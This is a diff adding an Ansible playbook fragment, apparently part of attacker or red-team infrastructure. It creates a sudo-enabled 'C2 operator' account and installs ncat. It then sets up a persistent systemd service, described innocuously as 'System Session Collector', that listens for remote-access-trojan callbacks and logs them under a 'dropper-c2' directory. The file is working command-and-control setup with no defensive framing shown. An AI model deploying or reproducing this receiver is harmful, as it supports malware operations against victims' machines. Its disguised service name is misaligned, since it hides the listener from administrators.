@@ -1,0 +1,58 @@
+---
+- name: Add C2 operator user
+  user:
+    name: '{{ username }}'
+    password: '{{ password | password_hash("sha512") }}'
+    shell: /bin/bash
+    groups: sudo
+    append: yes
+
+- name: Add host aliases
+  lineinfile:
+    path: /etc/hosts
+    line: "{{ item.ip }} {{ item.name }}"
+    state: present
+  loop: "{{ hosts_entries }}"
+
+- name: Install ncat
+  apt:
+    name: ncat
+    state: present
+    update_cache: yes
+
+- name: Create C2 log directory
+  file:
+    path: /var/log/dropper-c2
+    state: directory
+    owner: root
+    group: root
+    mode: "0755"
+
+
+
+- name: Create RAT callback receiver service
+  copy:
+    dest: /etc/systemd/system/dropper-rat-rcv.service
+    owner: root
+    group: root
+    mode: "0644"
+    content: |
+      [Unit]
+      Description=System Session Collector
+      After=network.target
+
+      [Service]
+      Type=simple
+      ExecStart=/bin/sh -c 'ncat -lk {{ rat_port }} >> /var/log/dropper-c2/rat.log 2>&1'
+      Restart=always
+      RestartSec=2
+
+      [Install]
+      WantedBy=multi-user.target
+
+- name: Enable and start RAT receiver
+  systemd:
+    name: dropper-rat-rcv.service
+    enabled: yes
+    state: started
+    daemon_reload: yes
